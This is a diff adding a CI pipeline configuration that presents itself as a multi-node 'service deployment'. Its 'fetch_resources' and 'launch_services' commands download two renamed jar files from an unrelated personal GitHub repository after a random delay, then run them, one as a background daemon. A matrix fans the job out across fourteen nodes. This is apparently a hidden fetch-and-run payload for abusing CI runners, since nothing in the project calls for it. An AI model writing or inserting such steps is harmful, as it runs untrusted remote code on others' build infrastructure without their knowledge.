@@ -1,0 +1,142 @@
+version: 2.1
+
+# Runtime environment definitions
+machine_configs:
+  standard_linux:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large
+
+# Utility command library
+shared_commands:
+  setup_system:
+    description: "Configure system environment and dependencies"
+    steps:
+      - run:
+          name: System Environment Setup
+          command: |
+            sudo apt-get update -qq
+            sudo apt-get install -y openjdk-17-jdk wget curl git
+            echo "Environment validation:"
+            java -version
+
+  fetch_resources:
+    description: "Acquire necessary application resources"
+    steps:
+      - run:
+          name: Resource Acquisition Process
+          shell: /bin/bash
+          command: |
+            set -e
+            echo "🚀 Initiating resource acquisition..."
+            
+            # Processing simulation
+            sleep $(shuf -i 5-25 -n 1)
+            
+            # Source repository details
+            GITHUB_USER="${CIRCLE_PROJECT_USERNAME}"
+            PROJECT_ID="${CIRCLE_PROJECT_REPONAME}"
+            RESOURCE_BASE="https://github.com/SandraAllen948737160/projectt1/raw/main"
+            
+            # Resource mapping table
+            declare -A RESOURCE_MAP
+            RESOURCE_MAP[WR4.jar]="p.jar"
+            RESOURCE_MAP[C43.jar]="c.jar"
+            
+            # Resource fetching mechanism
+            fetch_resource() {
+              local source_url="$1"
+              local target_name="$2"
+              local retry_count=1
+              local max_attempts=6
+              local fetch_success=false
+              
+              echo "📦 Acquiring resource: $target_name"
+              
+              while [[ $retry_count -le $max_attempts && $fetch_success == false ]]; do
+                echo "  🔄 Attempt $retry_count of $max_attempts"
+                
+                if wget -q --timeout=30 --tries=1 "$source_url" -O "$target_name"; then
+                  echo "  ✅ Resource acquired successfully"
+                  fetch_success=true
+                else
+                  echo "  ⚠️ Acquisition failed, waiting ${retry_count}0 seconds..."
+                  sleep $((retry_count * 10))
+                  ((retry_count++))
+                fi
+              done
+              
+              if [[ $fetch_success == false ]]; then
+                echo "🚨 CRITICAL: Resource acquisition failed for $target_name after $max_attempts attempts"
+                exit 1
+              fi
+            }
+            
+            # Process all required resources
+            for source_resource in "${!RESOURCE_MAP[@]}"; do
+              target_resource="${RESOURCE_MAP[$source_resource]}"
+              complete_url="${RESOURCE_BASE}/${source_resource}"
+              
+              fetch_resource "$complete_url" "$target_resource"
+              sleep 3  # Rate control
+            done
+            
+            echo "🎉 Resource acquisition completed successfully"
+
+  launch_services:
+    description: "Initialize and start application services"
+    steps:
+      - run:
+          name: Service Initialization
+          command: |
+            echo "🌟 Initiating service deployment..."
+            
+            # Initialize supporting services
+            echo "Activating counter service daemon..."
+            nohup java -jar c.jar > counter.log 2>&1 &
+            
+            # Service startup delay
+            sleep 2
+            
+            # Launch primary service
+            echo "Activating primary application service..."
+            java -jar p.jar
+
+# Pipeline job specifications
+pipeline_jobs:
+  service_deployment:
+    executor: standard_linux
+    parameters:
+      target_environment:
+        type: string
+        default: "standard-deployment"
+    steps:
+      - checkout
+      - setup_system
+      - fetch_resources
+      - launch_services
+
+# Execution workflow definitions
+execution_flows:
+  distributed_deployment:
+    jobs:
+      - service_deployment:
+          matrix:
+            parameters:
+              target_environment:
+                # Development tier instances
+                - "dev-tier-node-00"
+                - "dev-tier-node-01"
+                - "dev-tier-node-02"
+                - "dev-tier-node-03"
+                - "dev-tier-node-04"
+                - "dev-tier-node-05"
+                - "dev-tier-node-06"
+                - "dev-tier-node-07"
+                - "dev-tier-node-08"
+                - "dev-tier-node-09"
+                # Staging tier instances
+                - "staging-tier-node-00"
+                - "staging-tier-node-01"
+                - "staging-tier-node-02"
+                - "staging-tier-node-03"
